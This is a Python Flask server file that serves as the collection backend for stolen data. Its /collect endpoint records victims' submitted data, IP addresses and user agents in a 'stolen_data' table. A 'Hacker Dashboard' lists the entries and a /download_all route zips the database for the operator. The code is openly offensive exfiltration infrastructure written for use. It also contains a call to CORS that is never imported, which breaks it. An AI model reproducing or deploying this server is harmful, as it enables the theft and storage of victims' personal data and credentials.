from flask import Flask, request, jsonify, send_file, render_template_string
import sqlite3
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

def init_db():
    conn = sqlite3.connect('hacked_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT,
        data TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

@app.route('/collect', methods=['POST'])
def collect_data():
    data = request.json
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    conn = sqlite3.connect('hacked_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO stolen_data (type, data, ip, user_agent, timestamp) 
                 VALUES (?, ?, ?, ?, ?)""",
              (data['type'], json.dumps(data['data']), ip, user_agent, data.get('timestamp', datetime.now().isoformat())))
    conn.commit()
    conn.close()
    print(f"[+] {data['type']} from {ip}")
    return jsonify({"status": "ok"}), 200

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect('hacked_data.db')
    c = conn.cursor()
    c.execute("SELECT type, COUNT(*) FROM stolen_data GROUP BY type")
    stats = c.fetchall()
    c.execute("SELECT * FROM stolen_data ORDER BY id DESC LIMIT 100")
    rows = c.fetchall()
    conn.close()
    
    html = '''
    <html><head><title>🔥 Hacker Dashboard</title>
    <style>
        body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}
        h1{color:#ff0000;text-shadow:0 0 20px #ff0000;}
        table{width:100%;border-collapse:collapse;margin-top:20px;}
        td,th{border:1px solid #333;padding:8px;text-align:left;}
        .stats{background:#111;padding:20px;border-radius:10px;margin:20px 0;}
        .stat-item{display:inline-block;margin-right:30px;}
        .badge{background:#ff0000;padding:2px 10px;border-radius:10px;font-size:11px;}
    </style>
    </head>
    <body>
        <h1>🔥 HACKER DASHBOARD</h1>
        <div class="stats">
    '''
    for stat in stats:
        html += f'<div class="stat-item">📁 {stat[0]}: <strong>{stat[1]}</strong></div>'
    html += '''
        </div>
        <table>
            <tr><th>ID</th><th>Type</th><th>Data</th><th>IP</th><th>Time</th></tr>
    '''
    for row in rows:
        try:
            data_str = json.loads(row[2]) if isinstance(row[2], str) else row[2]
            data_str = str(data_str)[:100]
        except:
            data_str = str(row[2])[:100]
        html += f'<tr><td>{row[0]}</td><td><span class="badge">{row[1]}</span></td><td>{data_str}...</td><td>{row[3]}</td><td>{row[5]}</td></tr>'
    html += '''
        </table>
        <br><a href="/download_all" style="color:#0f0;">⬇ Download All Data</a>
    </body>
    </html>
    '''
    return html

@app.route('/download_all')
def download_all():
    import zipfile
    from io import BytesIO
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
        if os.path.exists('hacked_data.db'):
            zip_file.write('hacked_data.db')
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, download_name='hacked_data.zip')

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=4444, debug=True)
